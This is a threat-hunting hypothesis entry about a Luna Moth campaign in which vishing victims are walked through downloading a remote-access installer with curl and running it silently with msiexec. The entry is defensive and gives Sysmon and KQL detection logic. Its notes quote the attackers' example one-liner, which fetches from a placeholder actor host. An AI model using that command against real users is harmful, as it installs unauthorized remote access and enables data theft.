---
category: Flames
hypothesis: Adversaries (UNC3753 / Luna Moth) use the Windows command shell to curl-download
  an RMM MSI and install it with `msiexec /i ... /quiet` after a vishing-driven screen-share,
  establishing remote access without traditional malware.
id: H181
notes: 'Platform: Windows. Source: Mandiant/GTIG UNC3753 (Luna Moth / Silent Ransom
  Group) campaign against US law firms (June 5, 2026). Behavior: an operator who has
  the target screen-sharing pastes a one-liner that pulls an RMM MSI with curl and
  installs it silently — e.g. `curl -sL hxxp://<actor-ip>/installer -o "SuperOps.msi"
  && msiexec /i "SuperOps.msi" /quiet`. Detection: correlate the curl→msiexec sequence
  on one host within ~5 min. Sysmon Event ID 1 / Security 4688 for `curl.exe` whose
  command line carries a URL plus `-o`/`.msi`, immediately followed by `msiexec.exe`
  with `/i` + `/quiet`; Sysmon Event ID 3 / `DeviceNetworkEvents` for the curl HTTP(S)
  fetch to an IP/domain not owned by the RMM vendor; Sysmon Event ID 11 for the dropped
  `*.msi` in `%USERPROFILE%\Downloads` or `%TEMP%`. KQL: `DeviceProcessEvents | where
  FileName=="curl.exe" and ProcessCommandLine has_any(".msi","-o")` joined to `DeviceProcessEvents
  | where FileName=="msiexec.exe" and ProcessCommandLine contains "/quiet"` on `DeviceId`
  within 5m. Flag MSI source hosts not owned by the named RMM vendors (SuperOps, AnyDesk,
  BeyondTrust/Bomgar, Zoho Assist). Mandiant published Google SecOps rule "Execute
  MSI Files Downloaded via Curl" covering this exact chain. Cross-ref T1219 (Remote
  Access Software), T1569.002 (service install via msiexec), T1566.004 (the vishing
  initial access — see [[H182]]); baseline normal RMM/remote-access with [[B021]].'
submitter:
  link: https://x.com/jotunvillur
  name: Lauren Proehl
tactics:
- Execution
tags:
- execution
- rmm
- msiexec
- curl
- luna_moth
- windows
techniques:
- T1219
- T1569.002
- T1566.004
- T1059.003
---

## Summary

Adversaries (UNC3753 / Luna Moth / Silent Ransom Group) are using the Windows command shell to download a remote monitoring and management (RMM) installer with curl and silently install it via `msiexec /quiet` immediately after a vishing-induced screen-sharing session, establishing hands-on-keyboard remote access without dropping classic malware.

## Why
- The whole point of the curl→`msiexec /quiet` chain is that every component is a signed, legitimate utility — `curl.exe` ships in-box, `msiexec.exe` is a trusted installer, and the RMM payload is a commercially code-signed MSI — so no single artifact looks malicious; the *sequence and source* are the tell, which is exactly what makes a correlation hunt the right tool.
- This actor deploys data-theft extortion with no ransomware and no custom implant, so endpoint AV has almost nothing to fire on. Catching the install chain is often the earliest host-based opportunity to interdict the intrusion before bulk collection and exfil begin.
- The behavior is highly detectable because legitimate software deployment in a managed enterprise almost never looks like an interactive user shelling out to `curl` to pull an MSI from a bare IP and silently installing it — sanctioned RMM arrives via the deployment tooling, not an ad-hoc one-liner during a Teams/Zoom call.
- Anchoring on the curl→msiexec pattern (rather than on specific RMM names) generalizes: the same delivery one-liner catches whichever RMM the operator rotates to next, and the MSI-source allowlist check survives infrastructure churn.

## References
- [MITRE ATT&CK T1059.003 - Command and Scripting Interpreter: Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/)
- [Mandiant / GTIG - Seeking Counsel: Ongoing Targeted Campaign Against US Law Firms (source report)](https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms/)
- [Red Canary - Detecting RMM software and other remote admin tools](https://redcanary.com/blog/threat-detection/rmm-software/)
- [Intel 471 - Understanding and threat hunting for RMM software misuse](https://www.intel471.com/blog/understanding-and-threat-hunting-for-rmm-software-misuse)
- [Microsoft Security Blog - Signed malware impersonating workplace apps deploys RMM backdoors](https://www.microsoft.com/en-us/security/blog/2026/03/03/signed-malware-impersonating-workplace-apps-deploys-rmm-backdoors/)
- [LOLBAS - Msiexec.exe (living-off-the-land install/execute)](https://lolbas-project.github.io/lolbas/Binaries/Msiexec/)
- [BleepingComputer - FBI warns of Luna Moth extortion attacks targeting law firms](https://www.bleepingcomputer.com/news/security/fbi-warns-of-luna-moth-extortion-attacks-targeting-law-firms/)
